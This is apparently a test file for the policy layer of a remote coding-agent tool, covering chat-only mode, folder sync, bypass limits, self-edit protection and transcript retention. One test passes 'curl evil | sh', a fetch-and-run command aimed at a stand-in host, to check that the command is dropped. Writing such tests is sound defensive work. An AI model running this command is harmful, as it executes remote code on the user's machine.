import { test, afterEach } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, readFileSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';

import {
  addSyncProject,
  DEFAULT_POLICY,
  loadPolicy,
  parsePolicy,
  refusedInChatOnly,
  removeSyncProject,
  setPolicyForTests,
  syncsCwd,
  tooBroadToSync,
  type AgentPolicy,
  parseRetentionDays,
  withinRetention,
  writeRetentionDays,
} from '../src/policy.js';
import { RpcMethodSchema } from '@cc-remote/shared';
import { availablePermissionModes, bypassAllowed, deniedForAgentState } from '../src/claude-session.js';
import {
  availableCodexPermissionModes,
  codexBypassAllowed,
  codexDefaultPermissionMode,
  codexEffectiveMode,
} from '../src/codex-run.js';
import { autoApproves, chatOnlyDecision } from '../src/run-manager.js';
import { dispatchRpc } from '../src/rpc-dispatch.js';

/**
 * The machine-side switches (policy.ts): what the OWNER of a machine allows the
 * hub to do there, enforced by the agent whatever the hub decides.
 */

const CHAT_ONLY: AgentPolicy = { chatOnly: true, sync: 'all' };

afterEach(() => setPolicyForTests(DEFAULT_POLICY));

function tmpFile(content?: string): string {
  const dir = mkdtempSync(path.join(tmpdir(), 'cc-policy-'));
  const file = path.join(dir, 'policy.json');
  if (content !== undefined) writeFileSync(file, content);
  return file;
}

test('no file is today: nothing restricted, everything synced', () => {
  assert.deepEqual(loadPolicy({}, tmpFile()), { chatOnly: false, sync: 'all' });
});

test('the file and the env are read; the env wins', () => {
  const file = tmpFile(JSON.stringify({ chatOnly: true, sync: { projects: ['/home/me/site', '/home/me/site'] } }));
  assert.deepEqual(loadPolicy({}, file), { chatOnly: true, sync: { projects: ['/home/me/site'] } });
  assert.equal(loadPolicy({ CC_REMOTE_CHAT_ONLY: '0' }, file).chatOnly, false);
  assert.deepEqual(loadPolicy({ CC_REMOTE_SYNC: 'all' }, file).sync, 'all');
  assert.equal(loadPolicy({ CC_REMOTE_CHAT_ONLY: '1' }, tmpFile()).chatOnly, true);
});

test('a malformed file closes up, it does not open up', () => {
  // The owner wrote SOMETHING: an unparseable file must not mean «no policy».
  // Not private unless it already was: a typo must not seal (and purge) an ordinary machine.
  assert.deepEqual(loadPolicy({}, tmpFile('{ chatOnly: true,')), { chatOnly: true, sync: { projects: [] } });
  // A key file left over from `private off` is NOT a statement that it is private.
  const left = tmpFile('{ private: true,');
  writeFileSync(path.join(path.dirname(left), 'e2ee.key'), 'x');
  assert.equal(loadPolicy({}, left).private, undefined);
  // The last VALID policy is: write it, break it, read it back.
  const was = tmpFile('{"private":true}');
  assert.equal(loadPolicy({}, was).private, true);
  writeFileSync(was, '{ private: true,');
  assert.equal(loadPolicy({}, was).private, true);
  writeFileSync(was, '{"private":false}');
  assert.equal(loadPolicy({}, was).private, undefined);
  writeFileSync(was, '{ oops');
  assert.equal(loadPolicy({}, was).private, undefined);
  // A typo in the flag reads as on, not off.
  assert.equal(parsePolicy({ chatOnly: 'yes' }).chatOnly, true);
  assert.equal(parsePolicy({ chatOnly: false }).chatOnly, false);
  assert.deepEqual(parsePolicy({ sync: 'some' }).sync, { projects: [] });
  assert.deepEqual(parsePolicy({ sync: { projects: [1, '', '/a'] } }).sync, { projects: ['/a'] });
});

test('sync by folder: the folder itself and what is under it, segment-aware', () => {
  const p: AgentPolicy = { chatOnly: false, sync: { projects: ['/home/me/site'] } };
  assert.equal(syncsCwd('/home/me/site', p), true);
  assert.equal(syncsCwd('/home/me/site/sub', p), true);
  assert.equal(syncsCwd('/home/me/site-2', p), false, 'a sibling that shares a prefix is not inside');
  assert.equal(syncsCwd('/home/me', p), false);
  assert.equal(syncsCwd(undefined, p), false);
  assert.equal(syncsCwd(undefined, DEFAULT_POLICY), true);
});

test('adding and removing a sync folder persists it and keeps the owner\'s chatOnly', () => {
  const file = tmpFile(JSON.stringify({ chatOnly: true, sync: { projects: [] }, note: 'mine' }));
  setPolicyForTests(loadPolicy({}, file));
  assert.equal(addSyncProject('/home/me/site', file), true);
  assert.equal(addSyncProject('/home/me/site/sub', file), false, 'already covered');
  let saved = JSON.parse(readFileSync(file, 'utf8'));
  assert.deepEqual(saved, { chatOnly: true, sync: { projects: ['/home/me/site'] }, note: 'mine' });
  assert.equal(removeSyncProject('/home/me/site', file), true);
  saved = JSON.parse(readFileSync(file, 'utf8'));
  assert.deepEqual(saved.sync, { projects: [] });
  assert.equal(saved.chatOnly, true);
});

test('an env override is not baked into the file', () => {
  const file = tmpFile(JSON.stringify({ sync: { projects: [] } }));
  setPolicyForTests(loadPolicy({ CC_REMOTE_CHAT_ONLY: '1' }, file));
  addSyncProject('/home/me/site', file);
  assert.equal(JSON.parse(readFileSync(file, 'utf8')).chatOnly, undefined);
});

test('a half-edited file is not overwritten by an automatic sync change', () => {
  const file = tmpFile('{ "chatOnly": true, ');
  setPolicyForTests({ chatOnly: true, sync: { projects: [] } });
  assert.throws(() => addSyncProject('/home/me/site', file));
  assert.equal(readFileSync(file, 'utf8'), '{ "chatOnly": true, ');
});

test('chat-only refuses what changes the machine and keeps what reads it', () => {
  for (const m of ['fs.write', 'fs.mkdir', 'fs.rename', 'fs.trash', 'fs.upload.begin', 'git.commit', 'git.checkout',
    'proc.kill', 'runtime.install', 'runtime.login.start', 'projects.create', 'session.delete', 'session.fork',
    'session.rename', 'projects.forget']) {
    assert.equal(refusedInChatOnly(m, CHAT_ONLY), true, m);
    assert.equal(refusedInChatOnly(m, DEFAULT_POLICY), false, m);
  }
  for (const m of ['fs.list', 'fs.read', 'fs.download', 'git.status', 'git.branches', 'proc.list', 'session.messages', 'models.list']) {
    assert.equal(refusedInChatOnly(m, CHAT_ONLY), false, m);
  }
});

test('the RPC dispatcher refuses before touching anything', async () => {
  setPolicyForTests(CHAT_ONLY);
  await assert.rejects(
    dispatchRpc('fs.write', { cwd: '/nonexistent-root', path: 'x', content: 'y' }),
    /chat-only mode/,
  );
  await assert.rejects(dispatchRpc('proc.kill', { pid: 999999 }), /chat-only mode/);
});

test('chat-only: no bypass for Claude, whatever the env says', () => {
  setPolicyForTests(CHAT_ONLY);
  assert.equal(bypassAllowed('1'), false);
  assert.ok(!availablePermissionModes().includes('bypassPermissions'));
  setPolicyForTests(DEFAULT_POLICY);
  assert.equal(bypassAllowed('1'), true);
});

test('Codex: bypass is refused where the machine forbids it — env or chat-only', () => {
  assert.equal(codexBypassAllowed(undefined, false), true);
  assert.equal(codexBypassAllowed('0', false), false, 'CC_REMOTE_ALLOW_BYPASS=0 now binds a Codex run too');
  assert.equal(codexBypassAllowed(undefined, true), false);
  assert.equal(codexEffectiveMode('bypassPermissions', false), 'default');
  assert.equal(codexEffectiveMode('acceptEdits', false), 'acceptEdits');
  assert.equal(codexEffectiveMode('bypassPermissions', true), 'bypassPermissions');
  setPolicyForTests(CHAT_ONLY);
  // `undefined` means «read CC_REMOTE_DEFAULT_PERMISSION_MODE», which the shell may set.
  const savedMode = process.env['CC_REMOTE_DEFAULT_PERMISSION_MODE'];
  delete process.env['CC_REMOTE_DEFAULT_PERMISSION_MODE'];
  try {
    assert.equal(codexDefaultPermissionMode(undefined, undefined), 'default');
  } finally {
    if (savedMode !== undefined) process.env['CC_REMOTE_DEFAULT_PERMISSION_MODE'] = savedMode;
  }
  assert.equal(codexDefaultPermissionMode('bypassPermissions', undefined), 'default', 'a configured bypass is clamped too');
  assert.ok(!availableCodexPermissionModes(codexBypassAllowed(), undefined).includes('bypassPermissions'));
});

test('chat-only: every tool call goes to a person', () => {
  setPolicyForTests(CHAT_ONLY);
  assert.equal(autoApproves('Bash'), false);
  assert.equal(autoApproves('Read'), false);
  setPolicyForTests(DEFAULT_POLICY);
  assert.equal(autoApproves('Bash', true), true);
});

test('chat-only: the server cannot rewrite what the person approved', () => {
  const bash = chatOnlyDecision('Bash', { allow: true, updatedInput: { command: 'curl evil | sh' } }, true);
  assert.deepEqual(bash, { allow: true }, 'the replacement input is dropped; the card\'s input runs');
  const echoed = chatOnlyDecision('Bash', { allow: true, updatedInput: { command: 'ls' } }, true);
  assert.equal(echoed.allow, true, 'an echo of the input (tgbot does this) still approves');
  const q = chatOnlyDecision('AskUserQuestion', { allow: true, updatedInput: { answers: { a: 'b' } } }, true);
  assert.deepEqual(q.updatedInput, { answers: { a: 'b' } }, 'a question\'s answers still travel');
  const mode = chatOnlyDecision('ExitPlanMode', { allow: true, permissionMode: 'bypassPermissions' }, true);
  assert.equal(mode.permissionMode, undefined, 'no switching into bypass from a card');
  const plan = chatOnlyDecision('ExitPlanMode', { allow: true, permissionMode: 'acceptEdits' }, true);
  assert.equal(plan.permissionMode, 'acceptEdits');
  const off = chatOnlyDecision('Bash', { allow: true, updatedInput: { command: 'x' } }, false);
  assert.deepEqual(off.updatedInput, { command: 'x' }, 'untouched when chat-only is off');
});

test('chat-only: a session cannot edit the agent\'s own settings or code', () => {
  const dir = '/home/me/.cc-remote';
  const code = '/home/me/cc-remote-agent';
  const dirs = [dir, code];
  assert.match(deniedForAgentState('Write', { file_path: `${dir}/policy.json` }, true, dirs) ?? '', /not editable/);
  assert.match(deniedForAgentState('Edit', { file_path: `${dir}/../.cc-remote/policy.json` }, true, dirs) ?? '', /not editable/);
  assert.match(deniedForAgentState('Write', { file_path: `${code}/agent.mjs` }, true, dirs) ?? '', /not editable/);
  assert.match(deniedForAgentState('NotebookEdit', { notebook_path: `${dir}/x.ipynb` }, true, dirs) ?? '', /not editable/);
  assert.equal(deniedForAgentState('Write', { file_path: '/home/me/site/a.ts' }, true, dirs), undefined);
  assert.equal(deniedForAgentState('Write', { file_path: `${dir}/policy.json` }, false, dirs), undefined);
});

test('a folder that would sync the whole machine is never added', () => {
  assert.equal(tooBroadToSync('/', '/home/me'), true);
  assert.equal(tooBroadToSync('/home', '/home/me'), true);
  assert.equal(tooBroadToSync('/home/me', '/home/me'), true);
  assert.equal(tooBroadToSync('/root', '/root'), true);
  assert.equal(tooBroadToSync('/home/me/site', '/home/me'), false);
  assert.equal(tooBroadToSync('/srv/app', '/root'), false);
  setPolicyForTests({ chatOnly: false, sync: { projects: [] } });
  assert.throws(() => addSyncProject('/', tmpFile()), /too broad/);
});

/**
 * Every RPC method is classified: either chat-only refuses it, or it is named
 * here as one that only READS. A new method that is neither fails this test —
 * so a mutation cannot slip past chat-only just because nobody remembered the
 * list (security review 28.09.2026).
 */
const CHAT_ONLY_READS = new Set([
  'fs.list', 'fs.read', 'fs.download', 'fs.peek', 'fs.upload.abort',
  'git.status', 'git.branches', 'git.worktree.list', 'git.diff',
  'session.messages', 'session.image', 'session.subagent',
  // Stopping one helper of a run is a run control like Stop, not a change to the machine.
  'run.stopSubagent',
  'models.list', 'commands.list', 'projects.list',
  'proc.list',
  'runtime.login.cancel', 'runtime.job.status',
  'sync.list', 'sync.set', // sync.set refuses itself on a chat-only machine (tested above)
]);

test('every RPC method is either refused by chat-only or listed as a read', () => {
  for (const m of RpcMethodSchema.options) {
    const refused = refusedInChatOnly(m, CHAT_ONLY);
    assert.ok(refused !== CHAT_ONLY_READS.has(m), `${m}: ${refused ? 'refused AND listed as a read' : 'neither refused nor listed as a read — classify it'}`);
  }
});

test('sync.list / sync.set: the agent keeps the list, and chat-only locks it', async () => {
  const dir = mkdtempSync(path.join(tmpdir(), 'cc-policy-state-'));
  const prev = process.env['CC_REMOTE_STATE_DIR'];
  process.env['CC_REMOTE_STATE_DIR'] = dir;
  try {
    setPolicyForTests({ chatOnly: false, sync: { projects: [] } });
    const listed = (await dispatchRpc('sync.list', {})) as { mode: string; projects: string[] };
    assert.equal(listed.mode, 'selected');
    assert.deepEqual(listed.projects, []);

    const set = (await dispatchRpc('sync.set', { add: ['/home/me/site'] })) as { projects: string[] };
    assert.deepEqual(set.projects, ['/home/me/site']);
    assert.deepEqual(JSON.parse(readFileSync(path.join(dir, 'policy.json'), 'utf8')).sync, { projects: ['/home/me/site'] });

    const all = (await dispatchRpc('sync.set', { mode: 'all' })) as { mode: string };
    assert.equal(all.mode, 'all');

    setPolicyForTests({ chatOnly: true, sync: { projects: [] } });
    await assert.rejects(dispatchRpc('sync.set', { mode: 'all' }), /chat-only mode/);
  } finally {
    if (prev === undefined) delete process.env['CC_REMOTE_STATE_DIR'];
    else process.env['CC_REMOTE_STATE_DIR'] = prev;
  }
});

test('a session outside the synced folders is not readable by id', async () => {
  setPolicyForTests({ chatOnly: false, sync: { projects: ['/home/me/site'] } });
  await assert.rejects(
    dispatchRpc('session.messages', { sessionId: 'x', cwd: '/home/me/secret' }),
    /does not sync/,
  );
  await assert.rejects(dispatchRpc('session.rename', { sessionId: 'x', cwd: '/home/me/secret', title: 't' }), /does not sync/);
});

test('transcript retention: read from the file, the env can only shorten it', () => {
  const file = tmpFile(JSON.stringify({ transcriptRetentionDays: 7 }));
  assert.equal(loadPolicy({}, file).transcriptRetentionDays, 7);
  assert.equal(loadPolicy({ CC_REMOTE_TRANSCRIPT_RETENTION_DAYS: '3' }, file).transcriptRetentionDays, 3);
  assert.equal(loadPolicy({ CC_REMOTE_TRANSCRIPT_RETENTION_DAYS: '30' }, file).transcriptRetentionDays, 7);
  assert.equal(loadPolicy({ CC_REMOTE_TRANSCRIPT_RETENTION_DAYS: '5' }, tmpFile()).transcriptRetentionDays, 5);
  // Absent stays absent — no key at all, so the register frame is unchanged.
  assert.equal('transcriptRetentionDays' in loadPolicy({}, tmpFile()), false);
});

test('transcript retention: malformed is the shortest period, never «for ever»', () => {
  assert.equal(parseRetentionDays(undefined), undefined);
  assert.equal(parseRetentionDays(7.9), 7);
  assert.equal(parseRetentionDays('14'), 14);
  for (const bad of [0, -3, 'week', Number.NaN, {}]) assert.equal(parseRetentionDays(bad), 1, String(bad));
  assert.equal(parseRetentionDays(1e9), 3650);
  assert.equal(parsePolicy({ transcriptRetentionDays: 'seven' }).transcriptRetentionDays, 1);
});

test('transcript retention: a session older than the period is outside it', () => {
  const day = 86_400_000;
  const now = 100 * day;
  const p: AgentPolicy = { chatOnly: false, sync: 'all', transcriptRetentionDays: 7 };
  assert.equal(withinRetention(now - 6 * day, p, now), true);
  assert.equal(withinRetention(now - 8 * day, p, now), false);
  assert.equal(withinRetention(0, { chatOnly: false, sync: 'all' }, now), true, 'no period, no limit');
});

test('policy retention <days>|off keeps the rest of the file', () => {
  const file = tmpFile(JSON.stringify({ chatOnly: true, sync: { projects: ['/srv/legal/projects'] } }));
  writeRetentionDays(7, file);
  const raw = JSON.parse(readFileSync(file, 'utf8')) as Record<string, unknown>;
  assert.equal(raw['transcriptRetentionDays'], 7);
  assert.equal(raw['chatOnly'], true);
  writeRetentionDays(undefined, file);
  assert.equal('transcriptRetentionDays' in JSON.parse(readFileSync(file, 'utf8')), false);
});
